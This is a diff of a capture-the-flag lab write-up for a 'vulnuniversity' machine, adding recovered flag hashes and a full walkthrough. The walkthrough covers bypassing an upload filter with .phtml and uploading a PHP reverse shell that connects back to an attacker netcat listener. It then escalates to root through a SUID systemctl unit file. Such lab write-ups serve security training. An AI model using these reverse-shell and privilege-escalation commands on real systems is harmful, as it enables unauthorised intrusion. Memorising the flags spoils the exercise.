@@ -4,15 +4,8 @@ IP Address: 10.10.154.152
 
 ## Flags
 
-1.
-2.
-3.
-
-## What do we know?
-
-1. 
-2.
-3.
+1. 8bd7992fbe8a6ad22a63361004cfcedb
+2. a58ff8579f0a9270368d33a9966c7fd5
 
 ## Enumeration/Scanning
 
@@ -168,36 +161,218 @@ IP Address: 10.10.154.152
 
 ### Burp Suite:
 
-
+1. Intercepted file upload to http://10.10.73.128:3333/internal/ and sent it to intruder.
+2. Created file [phpext.txt](files/phpext.txt) containing by php extensions.
+3. Loaded [phpext.txt](files/phpext.txt) as the payload, then added § to the file extension in the payloads position, Finally, started attack.
+4. The server rejected all extensions except .phtml, so our payload will have the .phtml extension.
 
 ## Exploitation
 
-### Step 1: Vulnerability
+### Vulnerability
 
-- What is the vulnerability? How can it be exploited?
+The web server is vulnerable as it accepts and executes PHP files with the extension phtml. 
 
-### Step 2: Exploitation
+### Exploitation
 
-- What is the exploit? How will it be executed?
+1. To exploit this, we will upload a PHP reverse shell, forcing the host to make a connection to our listener.
+
+2. Git clone the php-reverse-shell repository and edit the php-reverse-shell.php file.
+```
+git clone https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php
+mv php-reverse-shell/php-reverse-shell.php ./php-reverse-shell.phtml; rm -rf php-reverse-shell
+```
+4. Change the `$ip` and `$port` variable to the attacker machine IP address and listener port.
+
+```php
+...
+// Usage
+// -----
+// See http://pentestmonkey.net/tools/php-reverse-shell if you get stuck.
+
+set_time_limit (0);
+$VERSION = "1.0";
+$ip = '127.0.0.1';  // CHANGE THIS
+$port = 1234;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = 'uname -a; w; id; /bin/sh -i';
+$daemon = 0;
+$debug = 0;
+
+//
+// Daemonise ourself if possible to avoid zombies later
+//
+...
+```
+
+5. Then navigate to http://10.10.73.128:3333/internal/uploads/php-reverse-shell.phtml and we will have a reverse shell.
+
+```sh
+$ sudo nc -lvnp 4444
+
+listening on [any] 4444 ...
+connect to [10.18.57.77] from (UNKNOWN) [10.10.247.112] 36308
+Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
+ 00:23:14 up 47 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+$ 
+```
 
 ## Privilege Escalation
 
-### Do you have sudo? 
+### Sudo
 
-```
-sudo -l
-```
-
-#### What SUID/GUID is available?
-
-```
-find / -perm -u=s -type f 2>/dev/null
+```sh
+$ sudo -l
+sudo: no tty present and no askpass program specified
 ```
 
+#### SUID/GUID 
 
-- What directories are available?
 
-- What files can you read?
+```sh
+$ find / -type f -perm -04000 -ls 2>/dev/null
+   402892     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newuidmap
+   393361     52 -rwsr-xr-x   1 root     root        49584 May 16  2017 /usr/bin/chfn
+   402893     36 -rwsr-xr-x   1 root     root        32944 May 16  2017 /usr/bin/newgidmap
+   393585    136 -rwsr-xr-x   1 root     root       136808 Jul  4  2017 /usr/bin/sudo
+   393363     40 -rwsr-xr-x   1 root     root        40432 May 16  2017 /usr/bin/chsh
+   393501     56 -rwsr-xr-x   1 root     root        54256 May 16  2017 /usr/bin/passwd
+   406711     24 -rwsr-xr-x   1 root     root        23376 Jan 15  2019 /usr/bin/pkexec
+   393490     40 -rwsr-xr-x   1 root     root        39904 May 16  2017 /usr/bin/newgrp
+   393424     76 -rwsr-xr-x   1 root     root        75304 May 16  2017 /usr/bin/gpasswd
+   405497     52 -rwsr-sr-x   1 daemon   daemon      51464 Jan 14  2016 /usr/bin/at
+   406941    100 -rwsr-sr-x   1 root     root        98440 Jan 29  2019 /usr/lib/snapd/snap-confine
+   406710     16 -rwsr-xr-x   1 root     root        14864 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
+   405145    420 -rwsr-xr-x   1 root     root       428240 Jan 31  2019 /usr/lib/openssh/ssh-keysign
+   393687     12 -rwsr-xr-x   1 root     root        10232 Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
+   666971     76 -rwsr-xr-x   1 root     root        76408 Jul 17  2019 /usr/lib/squid/pinger
+   402037     44 -rwsr-xr--   1 root     messagebus    42992 Jan 12  2017 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   402829     40 -rwsr-xr-x   1 root     root          38984 Jun 14  2017 /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
+   131164     40 -rwsr-xr-x   1 root     root          40128 May 16  2017 /bin/su
+   133166    140 -rwsr-xr-x   1 root     root         142032 Jan 28  2017 /bin/ntfs-3g
+   131133     40 -rwsr-xr-x   1 root     root          40152 May 16  2018 /bin/mount
+   131148     44 -rwsr-xr-x   1 root     root          44680 May  7  2014 /bin/ping6
+   131182     28 -rwsr-xr-x   1 root     root          27608 May 16  2018 /bin/umount
+   131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
+   131147     44 -rwsr-xr-x   1 root     root          44168 May  7  2014 /bin/ping
+   133163     32 -rwsr-xr-x   1 root     root          30800 Jul 12  2016 /bin/fusermount
+   405750     36 -rwsr-xr-x   1 root     root          35600 Mar  6  2017 /sbin/mount.cifs
+```
 
-- Run autoscript Linpeas
+#### Write Permissions
 
+```sh
+$  find / -writable 2>/dev/null | cut -d "/" -f 2,3 | grep -v proc | sort -u
+dev/char
+dev/fd
+dev/full
+dev/fuse
+dev/log
+dev/mqueue
+dev/net
+dev/null
+dev/ptmx
+dev/random
+dev/shm
+dev/stderr
+dev/stdin
+dev/stdout
+dev/tty
+dev/urandom
+dev/zero
+etc/systemd
+lib/systemd
+run/acpid.socket
+run/dbus
+run/lock
+run/php
+run/samba
+run/shm
+run/snapd-snap.socket
+run/snapd.socket
+run/systemd
+run/uuidd
+sys/fs
+sys/kernel
+tmp
+tmp/.ICE-unix
+tmp/.Test-unix
+tmp/.X11-unix
+tmp/.XIM-unix
+tmp/.font-unix
+tmp/tmp.O171jvRWoz
+tmp/tmp.O171jvRWoz.service
+tmp/tmp.bWhYqNtMwV
+tmp/tmp.bWhYqNtMwV.service
+tmp/tmp.r1ZwthMXgc
+tmp/tmp.r1ZwthMXgc.service
+tmp/tmp.synfjEYshH
+tmp/tmp.synfjEYshH.service
+tmp/tmp.vGA3Alee0i
+tmp/tmp.vGA3Alee0i.service
+tmp/tmp.vNAzk6Llmg
+tmp/tmp.vNAzk6Llmg.service
+tmp/tmp.zIOLyjd5CX
+var/cache
+var/crash
+var/lib
+var/lock
+var/spool
+var/tmp
+var/www
+```
+#### [GTFOBins](https://gtfobins.github.io/)
+
+We can search manually through [GTFOBins](https://gtfobins.github.io/) or use an automated script like [PEASS-NG](https://github.com/carlospolop/PEASS-ng).
+
+```sh
+$ find / -type f -perm -04000 -ls 2>/dev/null | grep "systemctl"
+   131166    648 -rwsr-xr-x   1 root     root         659856 Feb 13  2019 /bin/systemctl
+```
+
+We see that `systemctl` binary has the SUID bit set. According to GTFOBins, we can abuse this for priviledge escalation. We want to read `/root/root.txt`, so we will execute the `cat` command and output to `tmp` since we have permissions to write there.
+
+```sh
+TF=$(mktemp).service
+echo '[Service]
+Type=oneshot
+ExecStart=/bin/sh -c "cat /root/root.txt > /tmp/output"
+[Install]
+WantedBy=multi-user.target' > $TF
+./systemctl link $TF
+./systemctl enable --now $TF
+```
+In `tmp` we can now view `output`:
+
+```sh
+$ ls -lsa
+total 60
+4 drwxrwxrwt  8 root     root     4096 Sep 19 01:25 .
+4 drwxr-xr-x 23 root     root     4096 Jul 31  2019 ..
+4 drwxrwxrwt  2 root     root     4096 Sep 18 23:35 .ICE-unix
+4 drwxrwxrwt  2 root     root     4096 Sep 18 23:35 .Test-unix
+4 drwxrwxrwt  2 root     root     4096 Sep 18 23:35 .X11-unix
+4 drwxrwxrwt  2 root     root     4096 Sep 18 23:35 .XIM-unix
+4 drwxrwxrwt  2 root     root     4096 Sep 18 23:35 .font-unix
+4 -rw-r--r--  1 root     root       33 Sep 19 01:25 output
+4 drwx------  3 root     root     4096 Sep 19 01:05 systemd-private-d7e4993e369547e792a017a7c97ddec9-systemd-timesyncd.service-rwVx0o
+0 -rw-------  1 www-data www-data    0 Sep 19 01:23 tmp.O171jvRWoz
+4 -rw-rw-rw-  1 www-data www-data  116 Sep 19 01:24 tmp.O171jvRWoz.service
+0 -rw-------  1 www-data www-data    0 Sep 19 00:48 tmp.bWhYqNtMwV
+4 -rw-rw-rw-  1 www-data www-data  100 Sep 19 00:48 tmp.bWhYqNtMwV.service
+0 -rw-------  1 www-data www-data    0 Sep 19 00:48 tmp.r1ZwthMXgc
+4 -rw-rw-rw-  1 www-data www-data  100 Sep 19 00:48 tmp.r1ZwthMXgc.service
+0 -rw-------  1 www-data www-data    0 Sep 19 00:50 tmp.synfjEYshH
+4 -rw-rw-rw-  1 www-data www-data   90 Sep 19 00:50 tmp.synfjEYshH.service
+0 -rw-------  1 www-data www-data    0 Sep 19 00:48 tmp.vGA3Alee0i
+4 -rw-rw-rw-  1 www-data www-data  100 Sep 19 00:48 tmp.vGA3Alee0i.service
+0 -rw-------  1 www-data www-data    0 Sep 19 00:53 tmp.vNAzk6Llmg
+4 -rw-rw-rw-  1 www-data www-data   90 Sep 19 00:54 tmp.vNAzk6Llmg.service
+0 -rw-------  1 www-data www-data    0 Sep 19 00:56 tmp.zIOLyjd5CX
+$ cat output
+a58ff8579f0a9270368d33a9966c7fd5
+```
